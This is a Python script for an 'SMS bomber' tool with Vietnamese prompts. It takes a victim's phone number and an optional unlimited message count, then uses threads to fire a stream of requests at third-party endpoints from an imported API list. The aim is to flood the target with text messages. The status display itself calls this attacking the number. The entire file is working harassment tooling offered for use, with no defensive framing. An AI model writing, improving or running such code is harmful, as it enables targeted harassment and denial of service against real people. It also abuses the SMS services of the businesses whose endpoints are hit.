import requests
import time
import os
import threading
import itertools
from colorama import Fore, Style, init

from apis import API_LIST

init(autoreset=True)

class BomberV2:
    def __init__(self):
        self.phone_number = ""
        self.num_messages = 0
        self.success_count = 0
        self.failure_count = 0
        self.stop_event = threading.Event()
        self.lock = threading.Lock()

    def display_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner_art = r"""
██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗      ██╗   ██╗
██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗     ██║   ██║
██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝     ██║   ██║
██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗     ╚██╗ ██╔╝
██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║███████╗██║  ██║      ╚████╔╝
╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝       ╚═══╝
        """
        print(Fore.CYAN + Style.BRIGHT + banner_art)
        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════")
        print(Fore.GREEN + Style.BRIGHT + "                  TOOL SPAM SMS - BOMBER V2 BY SIGMA")
        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════")
        print(f"{Fore.RED}Author: Sigma")
        print(f"{Fore.RED}Version: 2.0 (2025)")
        print(f"{Fore.RED}GitHub: https://github.com/Hunoka07/Bomber.git")
        print(Fore.YELLOW + Style.BRIGHT + "═════════════════════════════════════════════════════════════════════\n")

    def get_user_input(self):
        while True:
            phone_input = input(f"{Fore.YELLOW}➤ Nhập SĐT (ví dụ: 0987654321): {Style.RESET_ALL}").strip()
            if phone_input.isdigit() and 9 <= len(phone_input) <= 11:
                self.phone_number = phone_input[1:] if phone_input.startswith('0') else phone_input
                break
            else:
                print(f"{Fore.RED}[!] Số điện thoại không hợp lệ. Vui lòng nhập lại.")

        while True:
            try:
                num_input = input(f"{Fore.YELLOW}➤ Số lượng tin nhắn (0 = vô hạn): {Style.RESET_ALL}").strip()
                self.num_messages = int(num_input)
                if self.num_messages >= 0:
                    break
                else:
                    print(f"{Fore.RED}[!] Vui lòng nhập một số không âm.")
            except ValueError:
                print(f"{Fore.RED}[!] Đây không phải là một số hợp lệ. Vui lòng nhập lại.")

    def send_request(self, api_config):
        try:
            api = api_config.copy()
            url = api['url'].format(phone=self.phone_number, phone_zero=f"0{self.phone_number}")
            method = api.get('method', 'POST').upper()
            
            data = api.get('data')
            if data:
                data = {k: str(v).format(phone=self.phone_number, phone_zero=f"0{self.phone_number}") for k, v in data.items()}

            json_payload = api.get('json')
            if json_payload:
                json_payload = {k: str(v).format(phone=self.phone_number, phone_zero=f"0{self.phone_number}") for k, v in json_payload.items()}

            headers = api.get('headers', {"User-Agent": "Mozilla/5.0"})

            if method == 'POST':
                response = requests.post(url, data=data, json=json_payload, headers=headers, timeout=10)
            elif method == 'GET':
                response = requests.get(url, params=data, headers=headers, timeout=10)
            else:
                with self.lock:
                    self.failure_count += 1
                return

            if response.status_code < 300:
                with self.lock:
                    self.success_count += 1
            else:
                with self.lock:
                    self.failure_count += 1
        except Exception:
            with self.lock:
                self.failure_count += 1

    def display_status(self):
        spinner = itertools.cycle(['-', '/', '|', '\\'])
        while not self.stop_event.is_set():
            total = self.success_count + self.failure_count
            mode = "Vô hạn" if self.num_messages == 0 else f"{total}/{self.num_messages}"
            
            status_line = (
                f"\r{Fore.CYAN}[{next(spinner)}] Đang tấn công SĐT: {self.phone_number} | "
                f"{Fore.WHITE}Chế độ: {mode} | "
                f"{Fore.GREEN}Thành công: {self.success_count} | "
                f"{Fore.RED}Thất bại: {self.failure_count} "
            )
            print(status_line, end="")
            time.sleep(0.1)

    def start_spamming(self):
        self.display_banner()
        self.get_user_input()
        
        print(Fore.YELLOW + "\n" + "─" * 70)
        print(f"{Fore.CYAN}            [*] Bắt đầu tấn công. Nhấn Ctrl+C để dừng. [*]")
        print(Fore.YELLOW + "─" * 70 + "\n")

        status_thread = threading.Thread(target=self.display_status)
        status_thread.start()

        threads = []
        try:
            if self.num_messages == 0:
                api_cycle = itertools.cycle(API_LIST)
                while not self.stop_event.is_set():
                    api = next(api_cycle)
                    thread = threading.Thread(target=self.send_request, args=(api,))
                    thread.start()
                    threads.append(thread)
                    time.sleep(0.05)
                    threads = [t for t in threads if t.is_alive()]
            else:
                for i in range(self.num_messages):
                    if self.stop_event.is_set():
                        break
                    api = API_LIST[i % len(API_LIST)]
                    thread = threading.Thread(target=self.send_request, args=(api,))
                    thread.start()
                    threads.append(thread)
                    time.sleep(0.05)
                    if len(threads) >= 20:
                        for t in threads:
                            t.join(timeout=5)
                        threads = [t for t in threads if t.is_alive()]

        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}[!] Đã nhận lệnh dừng từ người dùng...")
        finally:
            self.stop_event.set()
            status_thread.join()
            
            print("\n" + Fore.YELLOW + "─" * 70)
            print(f"{Fore.GREEN}            [*] HOÀN THÀNH TÁC VỤ SPAM! [*]")
            print(f"{Fore.GREEN}Tổng thành công: {self.success_count}")
            print(f"{Fore.RED}Tổng thất bại: {self.failure_count}")
            print(Fore.YELLOW + "─" * 70 + "\n")

if __name__ == "__main__":
    bomber = BomberV2()
    bomber.start_spamming()
